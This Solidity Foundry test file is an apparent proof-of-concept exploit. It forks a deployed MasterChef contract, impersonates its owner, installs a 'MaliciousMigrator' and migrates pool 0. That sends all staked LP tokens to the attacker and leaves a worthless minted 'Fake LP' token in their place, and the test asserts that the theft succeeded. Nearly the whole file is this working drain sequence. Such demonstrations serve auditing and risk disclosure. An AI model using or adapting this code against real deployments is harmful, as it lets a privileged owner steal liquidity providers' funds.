// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.12;

import "forge-std/Test.sol";

// Minimal ERC20 for new token
interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function mint(address to, uint256 amount) external;
}

// MasterChef interface (only functions we need)
interface IMasterChef {
    function owner() external view returns (address);
    function poolInfo(uint256) external view returns (address lpToken, uint256 allocPoint, uint256 lastRewardBlock, uint256 accSushiPerShare);
    function setMigrator(address _migrator) external;
    function migrate(uint256 _pid) external;
    function poolLength() external view returns (uint256);
}

// Malicious migrator contract
contract MaliciousMigrator {
    address public immutable attacker;
    IERC20Minimal public newToken;

    constructor(address _attacker, IERC20Minimal _newToken) public {
        attacker = _attacker;
        newToken = _newToken;
    }

    // Called by MasterChef.migrate
    // @dev lpToken is the old LP token address
    function migrate(IERC20Minimal lpToken) external returns (IERC20Minimal) {
        uint256 balance = lpToken.balanceOf(msg.sender);
        // Transfer all old LP tokens from MasterChef to attacker
        lpToken.transferFrom(msg.sender, attacker, balance);
        // Mint equal amount of new token to MasterChef
        newToken.mint(msg.sender, balance);
        return newToken;
    }
}

// Minimal ERC20 implementation (for new token) with mint
contract NewToken is IERC20Minimal {
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    mapping(address => uint256) public override balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name, string memory _symbol) public {
        name = _name;
        symbol = _symbol;
        decimals = 18;
    }

    function mint(address to, uint256 amount) external override {
        totalSupply += amount;
        balanceOf[to] += amount;
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        require(balanceOf[msg.sender] >= amount);
        balanceOf[msg.sender] -= amount;
        balanceOf[recipient] += amount;
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        require(allowance[sender][msg.sender] >= amount);
        allowance[sender][msg.sender] -= amount;
        balanceOf[sender] -= amount;
        balanceOf[recipient] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external override returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
}

contract ExploitTest is Test {
    // MasterChef contract on the fork
    IMasterChef constant masterChef = IMasterChef(0xc2edad668740f1aa35e4d8f227fb8e17dca888cd);
    // Attacker (test contract) will gain the LP tokens
    address attacker;
    // Owner of MasterChef on chain
    address owner;

    function setUp() public {
        attacker = address(this);
        // Discover the current owner
        owner = masterChef.owner();
        vm.label(owner, "MasterChefOwner");
    }

    function testOwnerStealsLpTokensViaMigration() public {
        // Ensure there is at least one pool
        uint256 poolCount = masterChef.poolLength();
        require(poolCount > 0, "No pools");

        // Get the lpToken of pool 0
        (address lpTokenAddr, , , ) = masterChef.poolInfo(0);
        IERC20Minimal lpToken = IERC20Minimal(lpTokenAddr);
        vm.label(lpTokenAddr, "LPToken");

        // Get the balance of LP tokens held by MasterChef
        uint256 masterChefBalance = lpToken.balanceOf(address(masterChef));
        require(masterChefBalance > 0, "Pool has no LP tokens");

        // Deploy a new token (the fake token)
        NewToken newToken = new NewToken("Fake LP", "fLP");
        vm.label(address(newToken), "FakeLP");

        // Deploy the malicious migrator
        MaliciousMigrator migrator = new MaliciousMigrator(attacker, newToken);

        // Impersonate the current owner
        vm.startPrank(owner);

        // Set the malicious migrator
        masterChef.setMigrator(address(migrator));

        // Migrate pool 0
        masterChef.migrate(0);

        vm.stopPrank();

        // After migration, old LP tokens should have been transferred to attacker
        uint256 attackerBalance = lpToken.balanceOf(attacker);
        assertEq(attackerBalance, masterChefBalance, "Attacker did not receive all LP tokens");

        // The MasterChef should now hold the same amount of fake tokens
        uint256 newTokenBalance = newToken.balanceOf(address(masterChef));
        assertEq(newTokenBalance, masterChefBalance, "MasterChef fake token balance mismatch");
    }
}
